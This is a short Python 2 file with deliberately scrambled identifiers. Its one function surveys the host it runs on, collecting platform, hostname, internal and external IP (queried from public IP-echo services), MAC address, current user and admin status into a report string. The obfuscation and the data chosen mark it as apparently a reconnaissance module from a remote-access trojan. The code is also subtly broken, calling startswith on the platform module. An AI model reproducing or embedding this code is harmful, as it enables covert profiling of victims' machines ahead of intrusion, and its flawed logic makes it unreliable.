# -*- coding: utf-8 -*-
import ctypes
import getpass
import os
import platform
import socket
import urllib
import uuid
def xWTiZYjcGlRKZbqRTGUReTzzfBOPCzBz(plat_type):
    YGjqBoZBWXewMRZgMPJgtQFJohnfAgyd = platform.platform()
    processor    = platform.processor()
    architecture = platform.architecture()[0]
    cBYmabZXYbdiPoSbAvrXgAtKIxDNkWMz = getpass.getuser()
    JSJsBCUqPfmAnwecCqcxgeKnVzUGFixZ    = socket.gethostname()
    CWAyItNSwznDuuWCAuAqxTkcajMGcsmo        = socket.getfqdn()
    kdblxKVqSbIVNdFMMfpLHseeQMzlmonM = socket.gethostbyname(JSJsBCUqPfmAnwecCqcxgeKnVzUGFixZ)
    MUpCVuhBvcICtJPBgFZwMVzsakVcPFxy     = uuid.getnode()
    UBLmERlOfnZxPdWyXVfNbxOrUJGPwkCq         = ':'.join(("%012X" % MUpCVuhBvcICtJPBgFZwMVzsakVcPFxy)[kWFtuPcTzhXQsxkZcspaKNvhNllUXCxh:kWFtuPcTzhXQsxkZcspaKNvhNllUXCxh+2] for kWFtuPcTzhXQsxkZcspaKNvhNllUXCxh in range(0, 12, 2))
    KXfoENWiUOKUFvvMvuPuUttPbRaYlBGL = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                   'ipecho.net/plain', 'myexternalip.com/raw' ]
    TKOHpXPOdSxxTUeWZpVEMSCUEjzBzzgr = ''
    for sUaJfpOuQuvOLAxfuwahzntNPiPrbwxU in KXfoENWiUOKUFvvMvuPuUttPbRaYlBGL:
        try:
            TKOHpXPOdSxxTUeWZpVEMSCUEjzBzzgr = urllib.urlopen('http://'+sUaJfpOuQuvOLAxfuwahzntNPiPrbwxU).read().rstrip()
        except IOError:
            pass
        if TKOHpXPOdSxxTUeWZpVEMSCUEjzBzzgr and (6 < len(TKOHpXPOdSxxTUeWZpVEMSCUEjzBzzgr) < 16):
            break
    XMVlasgMCxRNazLeIRciwinXpDvFdfpa = False
    if plat_type.startswith('win'):
        XMVlasgMCxRNazLeIRciwinXpDvFdfpa = ctypes.windll.shell32.IsUserAnAdmin() != 0
    elif plat_type.startswith('linux') or platform.startswith('darwin'):
        XMVlasgMCxRNazLeIRciwinXpDvFdfpa = os.getuid() == 0
    kkNPuuVHEnxiEWzYgGnKTSQwccmDfqPR = 'Yes' if XMVlasgMCxRNazLeIRciwinXpDvFdfpa else 'No'
    sCjvbJlOStGROcndoTDYKAqJkWUieTUl = '''
    System Platform     - {}
    Processor           - {}
    Architecture        - {}
    Hostname            - {}
    FQDN                - {}
    Internal IP         - {}
    External IP         - {}
    MAC Address         - {}
    Current User        - {}
    Admin Access        - {}
    '''.format(YGjqBoZBWXewMRZgMPJgtQFJohnfAgyd, processor, architecture,
    JSJsBCUqPfmAnwecCqcxgeKnVzUGFixZ, CWAyItNSwznDuuWCAuAqxTkcajMGcsmo, kdblxKVqSbIVNdFMMfpLHseeQMzlmonM, TKOHpXPOdSxxTUeWZpVEMSCUEjzBzzgr, UBLmERlOfnZxPdWyXVfNbxOrUJGPwkCq, cBYmabZXYbdiPoSbAvrXgAtKIxDNkWMz, kkNPuuVHEnxiEWzYgGnKTSQwccmDfqPR)
    return sCjvbJlOStGROcndoTDYKAqJkWUieTUl
